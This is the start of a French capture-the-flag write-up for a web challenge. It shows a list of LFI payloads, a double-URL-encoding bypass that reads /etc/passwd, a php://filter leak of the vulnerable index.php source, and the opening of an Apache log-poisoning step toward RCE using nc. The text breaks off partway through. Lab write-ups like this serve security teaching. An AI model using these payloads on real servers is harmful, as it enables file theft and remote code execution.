# **Bien plus qu'une simpe gallerie**
## <u>**Catégorie**</u>

Web, Box

## <u>**Description**</u> :

```
DESCRIPTION DU CHALL

Mitnick, un jeune stagiaire travaillant pour le projet INFEKTION a été missioné pour faire un site d'informations portant sur la guerre froide.

Il a essayé de sécuriser le site comme il pouvait, mais malheureusement pour lui il a laissé un moyen de prendre le contrôle du serveur...

FORMAT DU FLAG : MCTF{}
```

## <u>Hints</u> 

On verra

## <u>Auteur</u> 

0xSysr3ll

## <u>Solution</u> :

## Frontend web - LFI

Les pages sont chargées via le paramètre `?page=`.

On va donc essayer d'obtenir une LFI.

### Payload classiques :

- `/etc/passwd` : nok
- `../../../../../../../etc/passwd` : nok
- `../../../etc/passwd` : nok
- `....//....//....//....//etc/passwd` : nok

### Null byte :

`../../../etc/passwd%00` : nok

### Wrappers php :

`php://filter/read=string.rot13/resource=index.php` : nok

`php://filter/convert.base64-encode/resource=index.php` : nok

### Url encoding :

- `%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd` : nok
- `%252e%252e%252fetc%252fpasswd` : nok
- `%252e%252e%252fetc%252fpasswd%00` : nok

### Double url encoding :

`%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd` : OK !!

Pour leak le fichier `index.php`, on est obligés de passer par un wrapper `php`, puisque sinon le code va être exécuté.

`php://filter/convert.base64-encode/resource=index.php`

=> `php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dindex%252Ephp`

```php
<?php

ini_set('display_errors', 'Off');
ini_set('html_errors', 0);

function lfi_filter($value)
{
    $omit_words = array('..', '../', '/');
    rsort($omit_words);
    $new_string = str_replace($omit_words, '', $value);
    return $new_string;
}

if (isset($_GET["page"])) {
    $page = lfi_filter($_GET["page"]);
    include urldecode($page);
} else {
    include 'home.php';
}
```

## Frontend Web - RCE

Pour exploiter la LFI et migrer vers une RCE, nous pouvons utiliser cette technique :

```bash
nc 172.17.0.2 9000
GET /<?php phpinfo(); ?>
```

Cette requête est maintenant inscrite dans le fichier de logs apache : `/var/log/apache2/access.log`.

Et donc en requêtant ce fichier depuis le frontend web, elle sera normalement exécutée.
... (244 lignes restantes)